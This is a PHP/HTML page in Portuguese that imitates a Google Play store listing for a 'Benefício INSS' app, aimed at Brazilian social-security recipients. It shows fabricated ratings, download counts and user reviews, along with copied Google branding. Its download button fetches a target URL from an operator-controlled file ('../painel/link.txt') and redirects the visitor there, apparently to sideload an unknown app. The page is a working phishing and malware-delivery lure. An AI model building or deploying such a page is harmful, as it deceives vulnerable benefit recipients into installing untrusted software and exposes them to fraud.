<?php
// Caminho para o arquivo de texto
$arquivoLink = '../painel/link.txt';

// Lê o conteúdo do arquivo
$conteudoLink = file_get_contents($arquivoLink);

// Verifica se o arquivo foi lido com sucesso
if ($conteudoLink === false) {
    $conteudoLink = '#'; // Fallback caso o arquivo não seja lido corretamente
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="icon" href="favicon.ico" type="image/x-icon">
	<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
        <title>-MB-</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            overflow-x: hidden;
            position: relative; /* Necessário para posicionar a seta */
        }

        .header {
            background-color: #fff;
            color: black;
            padding: 10px 20px;
            text-align: center;
            opacity: 0;
            animation: fadeIn 1s 0.5s forwards;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            display: flex;
            align-items: center;
        }

        .header img {
            width: 150px;
            height: auto;
            margin-right: 20px;
        }

        .header h1 {
            margin: 0;
            font-size: 24px;
            text-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .container {
            max-width: 1200px;
            margin: 20px auto;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            opacity: 0;
            animation: fadeIn 1s 1s forwards;
        }

        .app-header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            opacity: 0;
            animation: fadeIn 1s 1.5s forwards;
        }

        .app-header img {
            width: 100px;
            height: 100px;
            border-radius: 8px;
            margin-right: 20px;
            transition: transform 0.3s;
        }

        .app-header img:hover {
            transform: scale(1.1);
        }

        .app-header h1 {
            margin: 0;
            font-size: 24px;
            text-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .rating {
            margin: 10px 0;
        }

        .rating span {
            font-size: 20px;
            color: #f1c40f;
        }

        .download-buttons a {
            display: inline-block;
            padding: 10px 20px;
            margin: 10px;
            color: white;
            background-color: #34a853;
            text-decoration: none;
            border-radius: 5px;
            font-size: 16px;
            transition: background-color 0.3s, transform 0.3s;
            position: relative;
        }

        .download-buttons a:hover {
            background-color: #2c8c4d;
            transform: scale(1.05);
        }

        .section {
            margin-bottom: 20px;
            opacity: 0;
            animation: fadeIn 1s 2s forwards;
        }

        .section h2 {
            font-size: 18px;
            margin-bottom: 10px;
        }

        .section p {
            margin: 0;
            color: #999999;
        }

        .screenshot-carousel {
            display: flex;
            overflow-x: auto;
            opacity: 0;
            animation: fadeIn 1s 2.5s forwards;
        }

        .screenshot-carousel img {
            width: 100%;
            max-width: 300px;
            margin-right: 10px;
            border-radius: 8px;
            transition: transform 0.3s;
        }

        .screenshot-carousel img:hover {
            transform: scale(1.1);
        }

        .footer {
            text-align: center;
            margin-top: 30px 30px;
            font-size: 12px;
            color: #666;
            opacity: 0;
            animation: fadeIn 1s 3s forwards;
        }

        .app-details {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .app-details div {
            margin-right: 20px;
            font-size: 12px;
        }

        .app-details h2 {
            font-size: 14px;
            margin-bottom: 5px;
			color:#999;
			font-weight:normal;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Estilo da seta animada */
        .scroll-to-bottom {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 80px; /* Largura do círculo */
            height: 80px; /* Altura do círculo */
            background-color: #34a853; /* Cor do círculo */
            border-radius: 50%; /* Forma circular */
            display: flex;
            align-items: center;
            justify-content: center;
            visibility: hidden; /* Inicialmente invisível */
            opacity: 0; /* Inicialmente invisível */
            z-index: 1000;
            transition: visibility 0s, opacity 0.5s ease;
        }

        .scroll-to-bottom .arrow {
            width: 0;
            height: 0;
            border-left: 20px solid transparent;
            border-right: 20px solid transparent;
            border-top: 40px solid white; /* Cor da seta e tamanho ajustado */
            border-bottom: 0;
            border-radius: 0;
        }

        /* Animação de piscar */
        @keyframes pulse {
            0% {
                opacity: 1;
            }
            50% {
                opacity: 0.5;
            }
            100% {
                opacity: 1;
            }
        }

        /* Animação de descer */
        @keyframes slideDown {
            0% {
                transform: translateY(-100vh); /* Começa no topo da tela */
            }
            100% {
                transform: translateY(calc(100vh - 80px)); /* Termina no rodapé com margem */
            }
        }

        .scroll-to-bottom.animate {
            visibility: visible;
            opacity: 1;
            animation: slideDown 5s linear forwards, pulse 2s forwards; /* Animação contínua */
        }

        /* Estilo da nova seção com imagem e texto */
        .review-section {
            display: flex;
            align-items: center;
            margin-top: 20px;
            padding: 20px;
            background-color: #f9f9f9;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        .review-section img {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            margin-right: 15px;
        }

        .review-section .review-text {
            font-size: 14px;
            color: #333;
        }

        .review-section .review-text h3 {
            margin: 0;
            font-size: 16px;
            font-weight: bold;
        }

        .review-section .review-text p {
            margin: 5px 0 0;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="./imgs/gpay.webp">
    </div>
    <div class="container">
        <div class="app-header">
            <img src="./imgs/app.webp">
            <div>
                <h1>Benefício INSS</h1>
                <div class="rating">
                    <span>★★★★☆</span> (4.5 de 5)
                </div>
                <div class="download-buttons">
                      <a href="<?php echo htmlspecialchars($conteudoLink, ENT_QUOTES, 'UTF-8'); ?>" id="download-link">Baixar aplicativo</a>
                </div>
            </div>
        </div>

        <div class="section">
            <h2>Sobre este app</h2>
            <p>O Aplicativo é simples, prático e seguro para você usar sempre que precisar, em todos os lugares.</p>
        </div>

        <div class="app-details">
            <div>
                <h2>Avaliações</h2>
                <p><strong>★★★★☆</strong> (4.5 de 5)</p>
            </div>
            <div>
                <h2>Downloads</h2>
                <p><strong>1.000.000+</strong></p>
            </div>
            <div>
                <h2>Classificação</h2>
                <p><strong>4.5/5</strong></p>
            </div>
        </div>

        <div class="section">
           
            <div class="screenshot-carousel">
                <img src="./imgs/01.webp">
                <img src="./imgs/02.webp">
                <img src="./imgs/03.webp">
                
            </div>
        </div>

        <div class="section">
            
            <p><strong>Versão:</strong> 31.7.1</p>
   
        </div>


        <!-- Nova seção com a imagem, título e subtítulo -->
        <div class="review-section">
            <img src="./imgs/ad.webp" alt="Usuário">
            <div class="review-text">
                <h3>Adriana Oliveira</h3>
                <p>"Ótimo aplicativo! Muito útil."</p>
            </div>
        </div>      

		<!-- Nova seção com a imagem, título e subtítulo -->
        <div class="review-section">
            <img src="./imgs/ma.webp" alt="Usuário">
            <div class="review-text">
                <h3>Mário Andrade</h3>
                <p>"Ótimo, consegui fazer a liberação do meu pagamento muito rápido."</p>
            </div>
        </div>      

		<div class="review-section">
            <img src="./imgs/ac.webp" alt="Usuário">
            <div class="review-text">
                <h3>EDMILSON JUNIOR</h3>
                <p>"muito fácil e eficiência no atendimento.....! rápido e descompactado.....! super útil para agilizar as coisas de nossa vida....!"</p>
            </div>
        </div>
    </div>

    <div class="footer">
        Termos de Serviço | Privacidade | Sobre o Google Play Desenvolvedores | Google Store 
    </div>
<br>
    <!-- Seta para baixo -->
    <div class="scroll-to-bottom" id="scroll-arrow">
        <div class="arrow"></div>
    </div>

    <script>
        document.getElementById('download-link').addEventListener('click', function(event) {
            event.preventDefault(); // Evita o redirecionamento padrão
            var scrollArrow = document.getElementById('scroll-arrow');
            // Exibe a seta e inicia a animação
            scrollArrow.classList.add('animate');
            // Simula o clique no link
            setTimeout(function() {
                window.location.href = document.getElementById('download-link').href;
            }, 500); // Aguarda 0.5 segundos para iniciar o download após a animação
        });
    </script>
</body>
</html>
